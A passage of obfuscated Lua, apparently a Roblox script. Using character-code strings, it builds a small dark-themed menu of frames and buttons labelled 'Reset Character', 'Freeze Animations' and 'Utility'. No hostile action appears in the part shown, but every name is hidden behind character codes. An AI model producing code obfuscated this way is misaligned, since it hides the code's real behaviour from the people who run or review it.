_llza[_sc(50,49,54)]=Instance.new(_sc(85,73,80,97,100,100,105,110,103),_llza[_sc(50,48,99)]);
_llza[_sc(50,49,54)][_sc(80,97,100,100,105,110,103,76,101,102,116)]=UDim.new(0, 2);
_llza[_sc(50,49,55)]=Instance.new(_sc(70,114,97,109,101),_llza[_sc(50,48,48)]);
_llza[_sc(50,49,55)][_sc(83,105,122,101)]=UDim2.new(1, 0, 0, 23);
_llza[_sc(50,49,55)][_sc(76,97,121,111,117,116,79,114,100,101,114)]=2;
_llza[_sc(50,49,55)][_sc(66,111,114,100,101,114,67,111,108,111,114,51)]=Color3.fromRGB(0, 0, 0);
_llza[_sc(50,49,55)][_sc(78,97,109,101)]=[[Reset]];
_llza[_sc(50,49,55)][_sc(66,111,114,100,101,114,83,105,122,101,80,105,120,101,108)]=0;
_llza[_sc(50,49,55)][_sc(66,97,99,107,103,114,111,117,110,100,84,114,97,110,115,112,97,114,101,110,99,121)]=1;
_llza[_sc(50,49,55)][_sc(80,111,115,105,116,105,111,110)]=UDim2.new(0, 0, 0.02941, 0);
_llza[_sc(50,49,55)][_sc(66,97,99,107,103,114,111,117,110,100,67,111,108,111,114,51)]=Color3.fromRGB(255, 255, 255);
_llza[_sc(50,49,56)]=Instance.new(_sc(84,101,120,116,66,117,116,116,111,110),_llza[_sc(50,49,55)]);
_llza[_sc(50,49,56)][_sc(90,73,110,100,101,120)]=49;
_llza[_sc(50,49,56)][_sc(66,111,114,100,101,114,83,105,122,101,80,105,120,101,108)]=0;
_llza[_sc(50,49,56)][_sc(66,97,99,107,103,114,111,117,110,100,67,111,108,111,114,51)]=Color3.fromRGB(255, 255, 255);
_llza[_sc(50,49,56)][_sc(70,111,110,116,70,97,99,101)]=Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
_llza[_sc(50,49,56)][_sc(84,101,120,116,84,114,97,110,115,112,97,114,101,110,99,121)]=1;
_llza[_sc(50,49,56)][_sc(84,101,120,116,83,105,122,101)]=14;
_llza[_sc(50,49,56)][_sc(84,101,120,116,67,111,108,111,114,51)]=Color3.fromRGB(0, 0, 0);
_llza[_sc(50,49,56)][_sc(83,105,122,101)]=UDim2.new(1, 0, 1, 0);
_llza[_sc(50,49,56)][_sc(66,111,114,100,101,114,67,111,108,111,114,51)]=Color3.fromRGB(0, 0, 0);
_llza[_sc(50,49,56)][_sc(66,97,99,107,103,114,111,117,110,100,84,114,97,110,115,112,97,114,101,110,99,121)]=1;
_llza[_sc(50,49,56)][_sc(78,97,109,101)]=[[button]];
_llza[_sc(50,49,57)]=Instance.new(_sc(85,73,80,97,100,100,105,110,103),_llza[_sc(50,49,56)]);
_llza[_sc(50,49,57)][_sc(80,97,100,100,105,110,103,84,111,112)]=UDim.new(0, 2);
_llza[_sc(50,49,57)][_sc(80,97,100,100,105,110,103,66,111,116,116,111,109)]=UDim.new(0, 2);
_llza[_sc(50,49,57)][_sc(80,97,100,100,105,110,103,82,105,103,104,116)]=UDim.new(0, 3);
_llza[_sc(50,49,57)][_sc(80,97,100,100,105,110,103,76,101,102,116)]=UDim.new(0, 3);
_llza[_sc(50,49,97)]=Instance.new(_sc(70,114,97,109,101),_llza[_sc(50,49,56)]);
_llza[_sc(50,49,97)][_sc(66,111,114,100,101,114,77,111,100,101)]=Enum.BorderMode.Inset;
_llza[_sc(50,49,97)][_sc(83,105,122,101)]=UDim2.new(1, 0, 1, 0);
_llza[_sc(50,49,97)][_sc(66,111,114,100,101,114,67,111,108,111,114,51)]=Color3.fromRGB(51, 51, 51);
_llza[_sc(50,49,97)][_sc(78,97,109,101)]=[[buttonFrame]];
_llza[_sc(50,49,97)][_sc(66,97,99,107,103,114,111,117,110,100,67,111,108,111,114,51)]=Color3.fromRGB(21, 21, 21);
_llza[_sc(50,49,98)]=Instance.new(_sc(85,73,83,116,114,111,107,101),_llza[_sc(50,49,97)]);
_llza[_sc(50,49,98)][_sc(84,104,105,99,107,110,101,115,115)]=2;
_llza[_sc(50,49,98)][_sc(78,97,109,101)]=[[outlineStroke]];
_llza[_sc(50,49,99)]=Instance.new(_sc(67,97,110,118,97,115,71,114,111,117,112),_llza[_sc(50,49,97)]);
_llza[_sc(50,49,99)][_sc(71,114,111,117,112,67,111,108,111,114,51)]=Color3.fromRGB(0, 0, 0);
_llza[_sc(50,49,99)][_sc(83,105,122,101)]=UDim2.new(1, 0, 1, 0);
_llza[_sc(50,49,99)][_sc(66,111,114,100,101,114,67,111,108,111,114,51)]=Color3.fromRGB(0, 0, 0);
_llza[_sc(50,49,99)][_sc(78,97,109,101)]=[[buttonFade]];
_llza[_sc(50,49,99)][_sc(66,111,114,100,101,114,83,105,122,101,80,105,120,101,108)]=0;
_llza[_sc(50,49,99)][_sc(66,97,99,107,103,114,111,117,110,100,67,111,108,111,114,51)]=Color3.fromRGB(255, 255, 255);
_llza[_sc(50,49,100)]=Instance.new(_sc(85,73,71,114,97,100,105,101,110,116),_llza[_sc(50,49,99)]);
_llza[_sc(50,49,100)][_sc(84,114,97,110,115,112,97,114,101,110,99,121)]=NumberSequence.new{NumberSequenceKeypoint.new(0.000, 1), NumberSequenceKeypoint.new(1.000, 0.7)};
_llza[_sc(50,49,100)][_sc(82,111,116,97,116,105,111,110)]=90;
_llza[_sc(50,49,101)]=Instance.new(_sc(84,101,120,116,76,97,98,101,108),_llza[_sc(50,49,56)]);
_llza[_sc(50,49,101)][_sc(66,111,114,100,101,114,83,105,122,101,80,105,120,101,108)]=0;
_llza[_sc(50,49,101)][_sc(66,97,99,107,103,114,111,117,110,100,67,111,108,111,114,51)]=Color3.fromRGB(255, 255, 255);
_llza[_sc(50,49,101)][_sc(70,111,110,116,70,97,99,101)]=Font.new([[rbxasset://fonts/families/Inconsolata.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
_llza[_sc(50,49,101)][_sc(84,101,120,116,83,116,114,111,107,101,67,111,108,111,114,51)]=Color3.fromRGB(255, 255, 255);
_llza[_sc(50,49,101)][_sc(84,101,120,116,83,105,122,101)]=14;
_llza[_sc(50,49,101)][_sc(83,105,122,101)]=UDim2.new(1, 0, 1, 0);
_llza[_sc(50,49,101)][_sc(84,101,120,116,67,111,108,111,114,51)]=Color3.fromRGB(255, 255, 255);
_llza[_sc(50,49,101)][_sc(66,111,114,100,101,114,67,111,108,111,114,51)]=Color3.fromRGB(0, 0, 0);
_llza[_sc(50,49,101)][_sc(84,101,120,116)]=[[Reset Character]];
_llza[_sc(50,49,101)][_sc(66,97,99,107,103,114,111,117,110,100,84,114,97,110,115,112,97,114,101,110,99,121)]=1;
_llza[_sc(50,49,101)][_sc(90,73,110,100,101,120)]=2;
_llza[_sc(50,49,101)][_sc(78,97,109,101)]=[[text]];
_llza[_sc(50,49,102)]=Instance.new(_sc(85,73,83,116,114,111,107,101),_llza[_sc(50,49,101)]);
_llza[_sc(50,49,102)][_sc(78,97,109,101)]=[[text]];
_llza[_sc(50,50,48)]=Instance.new(_sc(70,114,97,109,101),_llza[_sc(50,49,55)]);
_llza[_sc(50,50,48)][_sc(90,73,110,100,101,120)]=90;
_llza[_sc(50,50,48)][_sc(83,105,122,101)]=UDim2.new(0, 0, 1, 0);
_llza[_sc(50,50,48)][_sc(66,111,114,100,101,114,67,111,108,111,114,51)]=Color3.fromRGB(0, 0, 0);
_llza[_sc(50,50,48)][_sc(78,97,109,101)]=[[fillbar]];
_llza[_sc(50,50,48)][_sc(66,111,114,100,101,114,83,105,122,101,80,105,120,101,108)]=0;
_llza[_sc(50,50,48)][_sc(66,97,99,107,103,114,111,117,110,100,84,114,97,110,115,112,97,114,101,110,99,121)]=0.95;
_llza[_sc(50,50,48)][_sc(66,97,99,107,103,114,111,117,110,100,67,111,108,111,114,51)]=Color3.fromRGB(255, 255, 255);
_llza[_sc(50,50,49)]=Instance.new(_sc(70,114,97,109,101),_llza[_sc(50,48,48)]);
_llza[_sc(50,50,49)][_sc(83,105,122,101)]=UDim2.new(1, 0, 0, 23);
_llza[_sc(50,50,49)][_sc(76,97,121,111,117,116,79,114,100,101,114)]=2;
_llza[_sc(50,50,49)][_sc(66,111,114,100,101,114,67,111,108,111,114,51)]=Color3.fromRGB(0, 0, 0);
_llza[_sc(50,50,49)][_sc(78,97,109,101)]=[[FreezeAnim]];
_llza[_sc(50,50,49)][_sc(66,111,114,100,101,114,83,105,122,101,80,105,120,101,108)]=0;
_llza[_sc(50,50,49)][_sc(66,97,99,107,103,114,111,117,110,100,84,114,97,110,115,112,97,114,101,110,99,121)]=1;
_llza[_sc(50,50,49)][_sc(80,111,115,105,116,105,111,110)]=UDim2.new(0, 0, 0.02941, 0);
_llza[_sc(50,50,49)][_sc(66,97,99,107,103,114,111,117,110,100,67,111,108,111,114,51)]=Color3.fromRGB(255, 255, 255);
_llza[_sc(50,50,50)]=Instance.new(_sc(84,101,120,116,66,117,116,116,111,110),_llza[_sc(50,50,49)]);
_llza[_sc(50,50,50)][_sc(90,73,110,100,101,120)]=49;
_llza[_sc(50,50,50)][_sc(66,111,114,100,101,114,83,105,122,101,80,105,120,101,108)]=0;
_llza[_sc(50,50,50)][_sc(66,97,99,107,103,114,111,117,110,100,67,111,108,111,114,51)]=Color3.fromRGB(255, 255, 255);
_llza[_sc(50,50,50)][_sc(70,111,110,116,70,97,99,101)]=Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
_llza[_sc(50,50,50)][_sc(84,101,120,116,84,114,97,110,115,112,97,114,101,110,99,121)]=1;
_llza[_sc(50,50,50)][_sc(84,101,120,116,83,105,122,101)]=14;
_llza[_sc(50,50,50)][_sc(84,101,120,116,67,111,108,111,114,51)]=Color3.fromRGB(0, 0, 0);
_llza[_sc(50,50,50)][_sc(83,105,122,101)]=UDim2.new(1, 0, 1, 0);
_llza[_sc(50,50,50)][_sc(66,111,114,100,101,114,67,111,108,111,114,51)]=Color3.fromRGB(0, 0, 0);
_llza[_sc(50,50,50)][_sc(66,97,99,107,103,114,111,117,110,100,84,114,97,110,115,112,97,114,101,110,99,121)]=1;
_llza[_sc(50,50,50)][_sc(78,97,109,101)]=[[button]];
_llza[_sc(50,50,51)]=Instance.new(_sc(85,73,80,97,100,100,105,110,103),_llza[_sc(50,50,50)]);
_llza[_sc(50,50,51)][_sc(80,97,100,100,105,110,103,84,111,112)]=UDim.new(0, 2);
_llza[_sc(50,50,51)][_sc(80,97,100,100,105,110,103,66,111,116,116,111,109)]=UDim.new(0, 2);
_llza[_sc(50,50,51)][_sc(80,97,100,100,105,110,103,82,105,103,104,116)]=UDim.new(0, 3);
_llza[_sc(50,50,51)][_sc(80,97,100,100,105,110,103,76,101,102,116)]=UDim.new(0, 3);
_llza[_sc(50,50,52)]=Instance.new(_sc(70,114,97,109,101),_llza[_sc(50,50,50)]);
_llza[_sc(50,50,52)][_sc(66,111,114,100,101,114,77,111,100,101)]=Enum.BorderMode.Inset;
_llza[_sc(50,50,52)][_sc(83,105,122,101)]=UDim2.new(1, 0, 1, 0);
_llza[_sc(50,50,52)][_sc(66,111,114,100,101,114,67,111,108,111,114,51)]=Color3.fromRGB(51, 51, 51);
_llza[_sc(50,50,52)][_sc(78,97,109,101)]=[[buttonFrame]];
_llza[_sc(50,50,52)][_sc(66,97,99,107,103,114,111,117,110,100,67,111,108,111,114,51)]=Color3.fromRGB(21, 21, 21);
_llza[_sc(50,50,53)]=Instance.new(_sc(85,73,83,116,114,111,107,101),_llza[_sc(50,50,52)]);
_llza[_sc(50,50,53)][_sc(84,104,105,99,107,110,101,115,115)]=2;
_llza[_sc(50,50,53)][_sc(78,97,109,101)]=[[outlineStroke]];
_llza[_sc(50,50,54)]=Instance.new(_sc(67,97,110,118,97,115,71,114,111,117,112),_llza[_sc(50,50,52)]);
_llza[_sc(50,50,54)][_sc(71,114,111,117,112,67,111,108,111,114,51)]=Color3.fromRGB(0, 0, 0);
_llza[_sc(50,50,54)][_sc(83,105,122,101)]=UDim2.new(1, 0, 1, 0);
_llza[_sc(50,50,54)][_sc(66,111,114,100,101,114,67,111,108,111,114,51)]=Color3.fromRGB(0, 0, 0);
_llza[_sc(50,50,54)][_sc(78,97,109,101)]=[[buttonFade]];
_llza[_sc(50,50,54)][_sc(66,111,114,100,101,114,83,105,122,101,80,105,120,101,108)]=0;
_llza[_sc(50,50,54)][_sc(66,97,99,107,103,114,111,117,110,100,67,111,108,111,114,51)]=Color3.fromRGB(255, 255, 255);
_llza[_sc(50,50,55)]=Instance.new(_sc(85,73,71,114,97,100,105,101,110,116),_llza[_sc(50,50,54)]);
_llza[_sc(50,50,55)][_sc(84,114,97,110,115,112,97,114,101,110,99,121)]=NumberSequence.new{NumberSequenceKeypoint.new(0.000, 1), NumberSequenceKeypoint.new(1.000, 0.7)};
_llza[_sc(50,50,55)][_sc(82,111,116,97,116,105,111,110)]=90;
_llza[_sc(50,50,56)]=Instance.new(_sc(84,101,120,116,76,97,98,101,108),_llza[_sc(50,50,50)]);
_llza[_sc(50,50,56)][_sc(66,111,114,100,101,114,83,105,122,101,80,105,120,101,108)]=0;
_llza[_sc(50,50,56)][_sc(66,97,99,107,103,114,111,117,110,100,67,111,108,111,114,51)]=Color3.fromRGB(255, 255, 255);
_llza[_sc(50,50,56)][_sc(70,111,110,116,70,97,99,101)]=Font.new([[rbxasset://fonts/families/Inconsolata.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
_llza[_sc(50,50,56)][_sc(84,101,120,116,83,116,114,111,107,101,67,111,108,111,114,51)]=Color3.fromRGB(255, 255, 255);
_llza[_sc(50,50,56)][_sc(84,101,120,116,83,105,122,101)]=14;
_llza[_sc(50,50,56)][_sc(83,105,122,101)]=UDim2.new(1, 0, 1, 0);
_llza[_sc(50,50,56)][_sc(84,101,120,116,67,111,108,111,114,51)]=Color3.fromRGB(255, 255, 255);
_llza[_sc(50,50,56)][_sc(66,111,114,100,101,114,67,111,108,111,114,51)]=Color3.fromRGB(0, 0, 0);
_llza[_sc(50,50,56)][_sc(84,101,120,116)]=[[Freeze Animations]];
_llza[_sc(50,50,56)][_sc(66,97,99,107,103,114,111,117,110,100,84,114,97,110,115,112,97,114,101,110,99,121)]=1;
_llza[_sc(50,50,56)][_sc(90,73,110,100,101,120)]=2;
_llza[_sc(50,50,56)][_sc(78,97,109,101)]=[[text]];
_llza[_sc(50,50,57)]=Instance.new(_sc(85,73,83,116,114,111,107,101),_llza[_sc(50,50,56)]);
_llza[_sc(50,50,57)][_sc(78,97,109,101)]=[[text]];
_llza[_sc(50,50,97)]=Instance.new(_sc(70,114,97,109,101),_llza[_sc(50,50,49)]);
_llza[_sc(50,50,97)][_sc(90,73,110,100,101,120)]=90;
_llza[_sc(50,50,97)][_sc(83,105,122,101)]=UDim2.new(0, 0, 1, 0);
_llza[_sc(50,50,97)][_sc(66,111,114,100,101,114,67,111,108,111,114,51)]=Color3.fromRGB(0, 0, 0);
_llza[_sc(50,50,97)][_sc(78,97,109,101)]=[[fillbar]];
_llza[_sc(50,50,97)][_sc(66,111,114,100,101,114,83,105,122,101,80,105,120,101,108)]=0;
_llza[_sc(50,50,97)][_sc(66,97,99,107,103,114,111,117,110,100,84,114,97,110,115,112,97,114,101,110,99,121)]=0.95;
_llza[_sc(50,50,97)][_sc(66,97,99,107,103,114,111,117,110,100,67,111,108,111,114,51)]=Color3.fromRGB(255, 255, 255);
_llza[_sc(50,50,98)]=Instance.new(_sc(70,114,97,109,101),_llza[_sc(49,102,101)]);
_llza[_sc(50,50,98)][_sc(83,105,122,101)]=UDim2.new(0, 176, 0, 129);
_llza[_sc(50,50,98)][_sc(76,97,121,111,117,116,79,114,100,101,114)]=1;
_llza[_sc(50,50,98)][_sc(66,111,114,100,101,114,67,111,108,111,114,51)]=Color3.fromRGB(0, 0, 0);
_llza[_sc(50,50,98)][_sc(78,97,109,101)]=[[utilityTab]];
_llza[_sc(50,50,98)][_sc(66,111,114,100,101,114,83,105,122,101,80,105,120,101,108)]=0;
_llza[_sc(50,50,98)][_sc(66,97,99,107,103,114,111,117,110,100,67,111,108,111,114,51)]=Color3.fromRGB(11, 11, 11);
_llza[_sc(50,50,99)]=Instance.new(_sc(76,111,99,97,108,83,99,114,105,112,116),_llza[_sc(50,50,98)]);
_llza[_sc(50,50,99)][_sc(78,97,109,101)]=_sc(117,116,105,108,105,116,121,83,99,114,105,112,116);
_llza[_sc(50,50,100)]=Instance.new(_sc(85,73,76,105,115,116,76,97,121,111,117,116),_llza[_sc(50,50,98)]);
_llza[_sc(50,50,100)][_sc(72,111,114,105,122,111,110,116,97,108,70,108,101,120)]=Enum.UIFlexAlignment.Fill;
_llza[_sc(50,50,100)][_sc(83,111,114,116,79,114,100,101,114)]=Enum.SortOrder.LayoutOrder;
_llza[_sc(50,50,101)]=Instance.new(_sc(85,73,83,116,114,111,107,101),_llza[_sc(50,50,98)]);
_llza[_sc(50,50,101)][_sc(67,111,108,111,114)]=Color3.fromRGB(51, 51, 51);
_llza[_sc(50,50,101)][_sc(78,97,109,101)]=[[greystroke]];
_llza[_sc(50,50,101)][_sc(65,112,112,108,121,83,116,114,111,107,101,77,111,100,101)]=Enum.ApplyStrokeMode.Border;
_llza[_sc(50,50,101)][_sc(90,73,110,100,101,120)]=99;
_llza[_sc(50,50,102)]=Instance.new(_sc(70,114,97,109,101),_llza[_sc(50,50,98)]);
_llza[_sc(50,50,102)][_sc(83,105,122,101)]=UDim2.new(1, 0, 0, 4);
_llza[_sc(50,50,102)][_sc(66,111,114,100,101,114,67,111,108,111,114,51)]=Color3.fromRGB(0, 0, 0);
_llza[_sc(50,50,102)][_sc(78,97,109,101)]=[[======ACCENT======]];
_llza[_sc(50,50,102)][_sc(66,111,114,100,101,114,83,105,122,101,80,105,120,101,108)]=0;
_llza[_sc(50,50,102)][_sc(66,97,99,107,103,114,111,117,110,100,84,114,97,110,115,112,97,114,101,110,99,121)]=1;
_llza[_sc(50,50,102)][_sc(66,97,99,107,103,114,111,117,110,100,67,111,108,111,114,51)]=Color3.fromRGB(255, 255, 255);
_llza[_sc(50,51,48)]=Instance.new(_sc(70,114,97,109,101),_llza[_sc(50,50,102)]);
_llza[_sc(50,51,48)][_sc(83,105,122,101)]=UDim2.new(1, -2, 0, 2);
_llza[_sc(50,51,48)][_sc(66,111,114,100,101,114,67,111,108,111,114,51)]=Color3.fromRGB(0, 0, 0);
_llza[_sc(50,51,48)][_sc(78,97,109,101)]=[[GuiColor]];
_llza[_sc(50,51,48)][_sc(66,111,114,100,101,114,83,105,122,101,80,105,120,101,108)]=0;
_llza[_sc(50,51,48)][_sc(80,111,115,105,116,105,111,110)]=UDim2.new(0, 1, 0, 1);
_llza[_sc(50,51,48)][_sc(66,97,99,107,103,114,111,117,110,100,67,111,108,111,114,51)]=Color3.fromRGB(0, 124, 255);
_llza[_sc(50,51,49)]=Instance.new(_sc(85,73,67,111,114,110,101,114),_llza[_sc(50,51,48)]);
_llza[_sc(50,51,50)]=Instance.new(_sc(70,114,97,109,101),_llza[_sc(50,50,98)]);
_llza[_sc(50,51,50)][_sc(83,105,122,101)]=UDim2.new(1, 0, 0, 15);
_llza[_sc(50,51,50)][_sc(76,97,121,111,117,116,79,114,100,101,114)]=1;
_llza[_sc(50,51,50)][_sc(66,111,114,100,101,114,67,111,108,111,114,51)]=Color3.fromRGB(0, 0, 0);
_llza[_sc(50,51,50)][_sc(78,97,109,101)]=[[======TITLE======]];
_llza[_sc(50,51,50)][_sc(66,111,114,100,101,114,83,105,122,101,80,105,120,101,108)]=0;
_llza[_sc(50,51,50)][_sc(66,97,99,107,103,114,111,117,110,100,84,114,97,110,115,112,97,114,101,110,99,121)]=1;
_llza[_sc(50,51,50)][_sc(80,111,115,105,116,105,111,110)]=UDim2.new(0, 0, 0.02941, 0);
_llza[_sc(50,51,50)][_sc(66,97,99,107,103,114,111,117,110,100,67,111,108,111,114,51)]=Color3.fromRGB(255, 255, 255);
_llza[_sc(50,51,51)]=Instance.new(_sc(84,101,120,116,76,97,98,101,108),_llza[_sc(50,51,50)]);
_llza[_sc(50,51,51)][_sc(84,101,120,116,87,114,97,112,112,101,100)]=true;
_llza[_sc(50,51,51)][_sc(66,111,114,100,101,114,83,105,122,101,80,105,120,101,108)]=0;
_llza[_sc(50,51,51)][_sc(66,97,99,107,103,114,111,117,110,100,67,111,108,111,114,51)]=Color3.fromRGB(255, 255, 255);
_llza[_sc(50,51,51)][_sc(70,111,110,116,70,97,99,101)]=Font.new([[rbxasset://fonts/families/Inconsolata.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
_llza[_sc(50,51,51)][_sc(84,101,120,116,88,65,108,105,103,110,109,101,110,116)]=Enum.TextXAlignment.Left;
_llza[_sc(50,51,51)][_sc(84,101,120,116,84,114,97,110,115,112,97,114,101,110,99,121)]=0.3;
_llza[_sc(50,51,51)][_sc(84,101,120,116,83,105,122,101)]=14;
_llza[_sc(50,51,51)][_sc(83,105,122,101)]=UDim2.new(1, 0, 0, 15);
_llza[_sc(50,51,51)][_sc(84,101,120,116,67,111,108,111,114,51)]=Color3.fromRGB(255, 255, 255);
_llza[_sc(50,51,51)][_sc(66,111,114,100,101,114,67,111,108,111,114,51)]=Color3.fromRGB(0, 0, 0);
_llza[_sc(50,51,51)][_sc(84,101,120,116)]=[[Utility]];
_llza[_sc(50,51,51)][_sc(66,97,99,107,103,114,111,117,110,100,84,114,97,110,115,112,97,114,101,110,99,121)]=1;
_llza[_sc(50,51,51)][_sc(78,97,109,101)]=[[text]];
_llza[_sc(50,51,51)][_sc(80,111,115,105,116,105,111,110)]=UDim2.new(0.02273, 0, 0, 0);
_llza[_sc(50,51,52)]=Instance.new(_sc(85,73,83,116,114,111,107,101),_llza[_sc(50,51,51)]);
_llza[_sc(50,51,52)][_sc(78,97,109,101)]=[[text]];
_llza[_sc(50,51,53)]=Instance.new(_sc(85,73,80,97,100,100,105,110,103),_llza[_sc(50,51,51)]);
_llza[_sc(50,51,53)][_sc(80,97,100,100,105,110,103,76,101,102,116)]=UDim.new(0, 1);
_llza[_sc(50,51,54)]=Instance.new(_sc(84,101,120,116,66,117,116,116,111,110),_llza[_sc(50,51,50)]);
_llza[_sc(50,51,54)][_sc(66,111,114,100,101,114,83,105,122,101,80,105,120,101,108)]=0;
_llza[_sc(50,51,54)][_sc(66,97,99,107,103,114,111,117,110,100,67,111,108,111,114,51)]=Color3.fromRGB(255, 255, 255);
_llza[_sc(50,51,54)][_sc(70,111,110,116,70,97,99,101)]=Font.new([[rbxasset://fonts/families/Inconsolata.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
_llza[_sc(50,51,54)][_sc(84,101,120,116,84,114,97,110,115,112,97,114,101,110,99,121)]=0.3;
_llza[_sc(50,51,54)][_sc(84,101,120,116,83,105,122,101)]=14;
_llza[_sc(50,51,54)][_sc(84,101,120,116,67,111,108,111,114,51)]=Color3.fromRGB(255, 255, 255);
_llza[_sc(50,51,54)][_sc(83,105,122,101)]=UDim2.new(0, 35, 1, 0);
_llza[_sc(50,51,54)][_sc(66,111,114,100,101,114,67,111,108,111,114,51)]=Color3.fromRGB(0, 0, 0);
_llza[_sc(50,51,54)][_sc(84,101,120,116)]=[[-]];
_llza[_sc(50,51,54)][_sc(66,97,99,107,103,114,111,117,110,100,84,114,97,110,115,112,97,114,101,110,99,121)]=1;
_llza[_sc(50,51,54)][_sc(80,111,115,105,116,105,111,110)]=UDim2.new(1, -30, 0, 0);
_llza[_sc(50,51,54)][_sc(78,97,109,101)]=[[minimise]];
_llza[_sc(50,51,55)]=Instance.new(_sc(70,114,97,109,101),_llza[_sc(50,50,98)]);
_llza[_sc(50,51,55)][_sc(83,105,122,101)]=UDim2.new(1, 0, 0, 20);
_llza[_sc(50,51,55)][_sc(76,97,121,111,117,116,79,114,100,101,114)]=2;
_llza[_sc(50,51,55)][_sc(66,111,114,100,101,114,67,111,108,111,114,51)]=Color3.fromRGB(0, 0, 0);
_llza[_sc(50,51,55)][_sc(78,97,109,101)]=[[mobShiftlock]];
_llza[_sc(50,51,55)][_sc(66,111,114,100,101,114,83,105,122,101,80,105,120,101,108)]=0;
_llza[_sc(50,51,55)][_sc(66,97,99,107,103,114,111,117,110,100,84,114,97,110,115,112,97,114,101,110,99,121)]=1;
_llza[_sc(50,51,55)][_sc(80,111,115,105,116,105,111,110)]=UDim2.new(0, 0, 0.02941, 0);
_llza[_sc(50,51,55)][_sc(66,97,99,107,103,114,111,117,110,100,67,111,108,111,114,51)]=Color3.fromRGB(255, 255, 255);
_llza[_sc(50,51,56)]=Instance.new(_sc(84,101,120,116,66,117,116,116,111,110),_llza[_sc(50,51,55)]);
_llza[_sc(50,51,56)][_sc(90,73,110,100,101,120)]=50;
_llza[_sc(50,51,56)][_sc(66,111,114,100,101,114,83,105,122,101,80,105,120,101,108)]=0;
_llza[_sc(50,51,56)][_sc(66,97,99,107,103,114,111,117,110,100,67,111,108,111,114,51)]=Color3.fromRGB(255, 255, 255);
_llza[_sc(50,51,56)][_sc(70,111,110,116,70,97,99,101)]=Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
_llza[_sc(50,51,56)][_sc(84,101,120,116,84,114,97,110,115,112,97,114,101,110,99,121)]=1;
_llza[_sc(50,51,56)][_sc(84,101,120,116,83,105,122,101)]=14;
_llza[_sc(50,51,56)][_sc(84,101,120,116,67,111,108,111,114,51)]=Color3.fromRGB(0, 0, 0);
_llza[_sc(50,51,56)][_sc(83,105,122,101)]=UDim2.new(0, 20, 0, 20);
_llza[_sc(50,51,56)][_sc(66,111,114,100,101,114,67,111,108,111,114,51)]=Color3.fromRGB(0, 0, 0);
_llza[_sc(50,51,56)][_sc(66,97,99,107,103,114,111,117,110,100,84,114,97,110,115,112,97,114,101,110,99,121)]=1;
_llza[_sc(50,51,56)][_sc(78,97,109,101)]=[[button]];
_llza[_sc(50,51,57)]=Instance.new(_sc(85,73,80,97,100,100,105,110,103),_llza[_sc(50,51,56)]);
_llza[_sc(50,51,57)][_sc(80,97,100,100,105,110,103,84,111,112)]=UDim.new(0, 3);
_llza[_sc(50,51,57)][_sc(80,97,100,100,105,110,103,66,111,116,116,111,109)]=UDim.new(0, 3);
_llza[_sc(50,51,57)][_sc(80,97,100,100,105,110,103,82,105,103,104,116)]=UDim.new(0, 3);
_llza[_sc(50,51,57)][_sc(80,97,100,100,105,110,103,76,101,102,116)]=UDim.new(0, 3);
_llza[_sc(50,51,97)]=Instance.new(_sc(70,114,97,109,101),_llza[_sc(50,51,56)]);
_llza[_sc(50,51,97)][_sc(66,111,114,100,101,114,77,111,100,101)]=Enum.BorderMode.Inset;
_llza[_sc(50,51,97)][_sc(83,105,122,101)]=UDim2.new(1, 0, 1, 0);
_llza[_sc(50,51,97)][_sc(66,111,114,100,101,114,67,111,108,111,114,51)]=Color3.fromRGB(51, 51, 51);
_llza[_sc(50,51,97)][_sc(78,97,109,101)]=[[toggleFrame]];
_llza[_sc(50,51,97)][_sc(66,97,99,107,103,114,111,117,110,100,67,111,108,111,114,51)]=Color3.fromRGB(21, 21, 21);
_llza[_sc(50,51,98)]=Instance.new(_sc(85,73,83,116,114,111,107,101),_llza[_sc(50,51,97)]);
_llza[_sc(50,51,98)][_sc(84,104,105,99,107,110,101,115,115)]=2;
_llza[_sc(50,51,98)][_sc(78,97,109,101)]=[[outlineStroke]];
_llza[_sc(50,51,99)]=Instance.new(_sc(67,97,110,118,97,115,71,114,111,117,112),_llza[_sc(50,51,97)]);
_llza[_sc(50,51,99)][_sc(71,114,111,117,112,67,111,108,111,114,51)]=Color3.fromRGB(0, 0, 0);
_llza[_sc(50,51,99)][_sc(83,105,122,101)]=UDim2.new(1, 0, 1, 0);
_llza[_sc(50,51,99)][_sc(66,111,114,100,101,114,67,111,108,111,114,51)]=Color3.fromRGB(0, 0, 0);
_llza[_sc(50,51,99)][_sc(78,97,109,101)]=[[toggleFade]];
_llza[_sc(50,51,99)][_sc(66,111,114,100,101,114,83,105,122,101,80,105,120,101,108)]=0;
_llza[_sc(50,51,99)][_sc(66,97,99,107,103,114,111,117,110,100,67,111,108,111,114,51)]=Color3.fromRGB(255, 255, 255);
_llza[_sc(50,51,100)]=Instance.new(_sc(85,73,71,114,97,100,105,101,110,116),_llza[_sc(50,51,99)]);
_llza[_sc(50,51,100)][_sc(84,114,97,110,115,112,97,114,101,110,99,121)]=NumberSequence.new{NumberSequenceKeypoint.new(0.000, 1), NumberSequenceKeypoint.new(1.000, 0.7)};
_llza[_sc(50,51,100)][_sc(82,111,116,97,116,105,111,110)]=90;
_llza[_sc(50,51,101)]=Instance.new(_sc(84,101,120,116,76,97,98,101,108),_llza[_sc(50,51,55)]);
_llza[_sc(50,51,101)][_sc(84,101,120,116,87,114,97,112,112,101,100)]=true;
_llza[_sc(50,51,101)][_sc(66,111,114,100,101,114,83,105,122,101,80,105,120,101,108)]=0;
_llza[_sc(50,51,101)][_sc(66,97,99,107,103,114,111,117,110,100,67,111,108,111,114,51)]=Color3.fromRGB(255, 255, 255);
_llza[_sc(50,51,101)][_sc(70,111,110,116,70,97,99,101)]=Font.new([[rbxasset://fonts/families/Inconsolata.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
_llza[_sc(50,51,101)][_sc(84,101,120,116,88,65,108,105,103,110,109,101,110,116)]=Enum.TextXAlignment.Left;
_llza[_sc(50,51,101)][_sc(84,101,120,116,83,105,122,101)]=14;
_llza[_sc(50,51,101)][_sc(83,105,122,101)]=UDim2.new(0, 155, 0, 20);
